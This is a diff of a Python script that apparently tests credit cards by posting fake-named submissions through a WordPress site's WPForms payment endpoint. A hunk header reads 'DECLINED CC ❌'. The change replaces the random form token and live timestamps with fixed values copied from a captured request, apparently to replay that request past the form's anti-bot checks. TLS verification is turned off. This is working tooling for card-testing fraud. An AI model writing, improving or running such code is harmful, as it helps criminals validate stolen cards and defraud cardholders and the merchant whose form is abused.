@@ -559,7 +559,7 @@ DECLINED CC ❌
             first_name = random.choice(['Sam', 'John', 'Mike', 'David', 'Chris', 'Alex', 'James', 'Tom'])
             last_name = random.choice(['Jones', 'Smith', 'Brown', 'Wilson', 'Taylor', 'Anderson', 'Thomas', 'Jackson'])
             
-            # Prepare multipart form data
+            # Prepare multipart form data (using exact values from original request)
             files = {
                 'wpforms[fields][0][first]': (None, first_name),
                 'wpforms[fields][0][last]': (None, last_name),
@@ -573,10 +573,10 @@ DECLINED CC ❌
                 'page_id': (None, '1238'),
                 'wpforms[post_id]': (None, '1238'),
                 'wpforms[payment_method_id]': (None, payment_method_id),
-                'wpforms[token]': (None, ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))),
+                'wpforms[token]': (None, 'acf8ebece6eddc72b625d36ac5d6c065'),
                 'action': (None, 'wpforms_submit'),
-                'start_timestamp': (None, str(int(time.time()))),
-                'end_timestamp': (None, str(int(time.time()) + random.randint(20, 40))),
+                'start_timestamp': (None, '1766931108'),
+                'end_timestamp': (None, '1766931135'),
             }
             
             response = r.post(f'{BASE_URL}/wp-admin/admin-ajax.php', headers=headers, files=files, timeout=30, verify=False)
